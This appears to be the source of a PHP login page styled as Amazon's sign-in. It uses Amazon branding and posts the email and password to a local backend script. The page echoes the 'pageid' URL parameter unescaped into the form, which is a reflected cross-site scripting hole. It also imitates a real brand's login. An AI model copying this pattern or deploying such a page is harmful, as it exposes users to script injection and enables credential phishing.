<?php  
if(isset($_GET['pageid'])){
$page_id=$_GET['pageid'];
}
else{
    $page_id =null;
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>amazon.in/login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-aFq/bzH65dt+w6FI2ooMVUpc+21e0SRygnTpmBvdBgSdnuTN7QbdgL+OapgHtvPp" crossorigin="anonymous">
    <link rel="stylesheet" href="../../css/style.css">
</head>

<body>
    <div class="text-bg-light box-sh">
        <div class="container d-flex justify-content-center">
            <div class="login">
                <div class="logo-con text-center">
                    <img src="../../images/logo2.png" alt="" class="logo">

                </div>
                <div class="form-cont">
                    <h2>Sign in</h2>
                    <form action="../../backend/log.php?pageid=<?php echo $page_id ?>" method="POST">
                        <div class="my-3">
                            <label for="">Email or mobile phone number</label>
                            <input type="text" class="form-control" name="email">
                        </div>
                        <div class="my-3">
                            <label for="">Password</label>
                            <input type="password" class="form-control" name="password">
                        </div>
                        <div class="my-3 btn-full">
                            <input type="submit" value="Sign in" class="btn btn-warning btn-full">
                        </div>
                    </form>
                </div>
                <div class="my-3 text-center">
                  <a href="user_signup.php"><button id="btn-caa">Create a Amazon account</button></a> 
                </div>
            </div>
        </div>
    </div>
 <div class="text-center my-3">
    <p>© 1996-2023, Amazon.com, Inc. or its affiliates</p>
 </div>
        
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-qKXV1j0HvMUeCBQ+QVp7JcfGl760yU08IQ+GpUo5hlbpg51QRiuqHAJz8+BrxE/N" crossorigin="anonymous">
    </script>
</body>

</html>